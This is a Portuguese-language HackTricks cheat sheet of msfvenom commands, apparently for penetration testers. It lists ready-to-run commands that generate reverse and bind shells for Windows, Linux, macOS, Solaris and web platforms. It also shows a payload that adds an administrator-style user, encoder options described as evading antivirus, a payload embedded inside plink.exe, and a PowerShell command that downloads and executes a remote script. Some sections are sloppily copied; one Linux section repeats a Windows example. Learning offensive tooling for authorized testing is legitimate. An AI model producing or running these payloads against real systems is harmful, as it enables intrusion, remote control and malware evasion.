# MSFVenom - CheatSheet

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novos programas de recompensa por bugs

💬 Participe de discussões na comunidade

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Também é possível usar `-a` para especificar a arquitetura ou `--platform`. 

## Listagem
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Parâmetros comuns ao criar um shellcode

### `-p` ou `--payload`

O parâmetro `-p` ou `--payload` é usado para especificar o payload que será usado para gerar o shellcode. O Metasploit Framework oferece uma ampla variedade de payloads para escolher, incluindo payloads para diferentes sistemas operacionais e arquiteturas.

### `-f` ou `--format`

O parâmetro `-f` ou `--format` é usado para especificar o formato de saída do shellcode. O Metasploit Framework suporta vários formatos de saída, incluindo `c`, `python`, `ruby`, `raw`, `exe`, `elf`, `dll` e muitos outros.

### `-e` ou `--encoder`

O parâmetro `-e` ou `--encoder` é usado para especificar o encoder que será usado para ofuscar o payload. O Metasploit Framework oferece vários encoders para escolher, incluindo encoders que podem ajudar a evitar a detecção de antivírus.

### `-b` ou `--bad-chars`

O parâmetro `-b` ou `--bad-chars` é usado para especificar caracteres que não devem estar presentes no shellcode gerado. Isso é útil para evitar problemas de codificação que podem fazer com que o shellcode falhe.

### `-a` ou `--arch`

O parâmetro `-a` ou `--arch` é usado para especificar a arquitetura do sistema de destino. O Metasploit Framework suporta várias arquiteturas, incluindo `x86`, `x64`, `armle`, `aarch64` e outras.

### `-s` ou `--space`

O parâmetro `-s` ou `--space` é usado para especificar o tamanho do espaço disponível para o shellcode. Isso é útil para garantir que o shellcode gerado caiba no espaço disponível na memória do sistema de destino.
```bash
-b "\x00\x0a\x0d" 
-f c 
-e x86/shikata_ga_nai -i 5 
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Shell Reverso**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell

Uma shell de ligação é uma técnica de invasão que permite que um invasor assuma o controle de um sistema remoto abrindo uma porta de escuta em um servidor e aguardando que uma conexão seja estabelecida. Quando a conexão é estabelecida, o invasor pode executar comandos no sistema remoto como se estivesse sentado na frente dele.

O Metasploit Framework fornece uma maneira fácil de criar uma shell de ligação usando o módulo `msfvenom`. O comando abaixo cria uma shell de ligação do Windows que se conecta à porta 4444:

```
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > shell.exe
```

Este comando cria um arquivo executável chamado `shell.exe` que, quando executado em um sistema Windows, abrirá uma porta de escuta na porta 4444 e aguardará uma conexão. O invasor pode então se conectar à porta usando uma ferramenta como o `netcat` e assumir o controle do sistema remoto.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Criar Usuário
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Executar Comando**

#### **Descrição**

O payload de execução de comando permite que o invasor execute comandos arbitrários no sistema de destino.

#### **Sintaxe**

```
msfvenom -p cmd/unix/reverse_{perl,python,bash,ruby} LHOST=<attacker IP> LPORT=<attacker port> -f <format> > shell.{<format>}
```

#### **Exemplo**

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.100 LPORT=4444 -f raw > shell.sh
```

Este comando criará um payload que, quando executado no sistema de destino, se conectará ao endereço IP do atacante na porta especificada e permitirá que o invasor execute comandos arbitrários no sistema de destino. O payload será salvo em um arquivo chamado `shell.sh`.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Codificador
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Incorporado dentro de um executável
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Cargas úteis do Linux

### Shell Reverso
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell

Uma shell de ligação é uma técnica de invasão que permite que um invasor assuma o controle de um sistema remoto abrindo uma porta de escuta em um servidor e aguardando que uma conexão seja estabelecida. Quando a conexão é estabelecida, o invasor pode executar comandos no sistema remoto como se estivesse sentado na frente dele.

O Metasploit Framework fornece uma maneira fácil de criar uma shell de ligação usando o módulo `msfvenom`. O comando abaixo cria uma shell de ligação do Windows que se conecta à porta 4444:

```
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > shell.exe
```

Este comando cria um arquivo executável chamado `shell.exe` que, quando executado em um sistema Windows, abrirá uma porta de escuta na porta 4444 e aguardará uma conexão. O invasor pode então se conectar à porta usando uma ferramenta como o `netcat` e assumir o controle do sistema remoto.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

O SunOS (também conhecido como Solaris) é um sistema operacional Unix desenvolvido pela Sun Microsystems, agora parte da Oracle Corporation. É amplamente utilizado em servidores corporativos e data centers. O Solaris é conhecido por sua segurança e estabilidade, o que o torna um alvo atraente para hackers que desejam comprometer sistemas de alto valor.
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **Cargas Úteis MAC**

### **Shell Reverso:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Shell de Bind**

A shell de bind é uma técnica de invasão que permite ao invasor abrir um shell em uma porta específica do sistema alvo e aguardar que o alvo se conecte a essa porta para estabelecer uma conexão. Isso permite que o invasor assuma o controle do sistema alvo e execute comandos nele. O `msfvenom` pode ser usado para gerar payloads de shell de bind para várias arquiteturas e sistemas operacionais.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Cargas úteis baseadas na Web**

### **PHP**

#### Shell reverso
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Shell reverso

#### Descrição

O payload ASP/x é um payload do Metasploit que permite a execução de um shell reverso em sistemas Windows que possuem o IIS (Internet Information Services) instalado. O shell reverso permite que um atacante obtenha acesso remoto ao sistema comprometido.

#### Sintaxe

A sintaxe básica do payload ASP/x é a seguinte:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f asp > shell.asp
```

#### Parâmetros

- `-p windows/shell_reverse_tcp`: especifica o payload a ser usado.
- `LHOST`: endereço IP do atacante.
- `LPORT`: porta do atacante.

#### Exemplo

O exemplo a seguir cria um payload ASP/x que se conecta ao endereço IP `192.168.0.10` na porta `4444`:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f asp > shell.asp
```
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Shell reverso
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Shell Reverso
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS é uma plataforma de desenvolvimento de software de código aberto que permite aos desenvolvedores criar aplicativos de rede escaláveis e de alta performance usando JavaScript. Ele é baseado no motor JavaScript V8 do Google Chrome e é executado em um ambiente de tempo de execução do lado do servidor. Com NodeJS, os desenvolvedores podem criar aplicativos de rede em tempo real, aplicativos de streaming de dados e aplicativos da web altamente escaláveis. Ele também é usado para criar ferramentas de linha de comando e scripts de automação.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Cargas úteis de linguagem de script**

### **Perl**

O Perl é uma linguagem de script de alto nível que é usada principalmente para automação de tarefas e processamento de texto. O Metasploit Framework suporta a criação de cargas úteis em Perl usando o `msfvenom`. As cargas úteis em Perl são úteis para explorar vulnerabilidades em sistemas operacionais baseados em Unix. Para criar uma carga útil em Perl, use o seguinte comando:

```
msfvenom -p cmd/unix/reverse_perl LHOST=<attacker IP> LPORT=<attacker port> -f <format> > <output file>
```

Substitua `<attacker IP>` pelo endereço IP do atacante e `<attacker port>` pela porta que o atacante está ouvindo. O `<format>` pode ser qualquer formato suportado pelo `msfvenom`, como `raw`, `c`, `python`, `ruby`, `bash`, `exe`, `elf`, `dll`, `psh`, `jsp`, `war`, `asp`, `aspx`, `jsp`, `jspx`, `pl`, `pm`, `s`, `msi`, `hta`, `vba`, `vbs`, `hta-psh` ou `loop-vbs`. O `<output file>` é o nome do arquivo de saída que conterá a carga útil em Perl.
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python é uma linguagem de programação de alto nível, interpretada e orientada a objetos. É amplamente utilizada em hacking devido à sua facilidade de uso e grande quantidade de bibliotecas disponíveis. O Python pode ser usado para escrever scripts de automação, ferramentas de hacking e exploits. Além disso, muitas ferramentas de hacking populares, como o Metasploit Framework, são escritas em Python.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash é uma linguagem de script amplamente utilizada em sistemas operacionais baseados em Unix. É uma ferramenta poderosa para a automação de tarefas e pode ser usada para criar scripts de shell que executam várias tarefas, como gerenciamento de arquivos, instalação de pacotes e execução de comandos do sistema. O Bash também é uma ferramenta útil para hackers, pois pode ser usado para criar scripts de shell que automatizam tarefas de hacking, como a criação de payloads do Metasploit usando o msfvenom.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais sobre bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
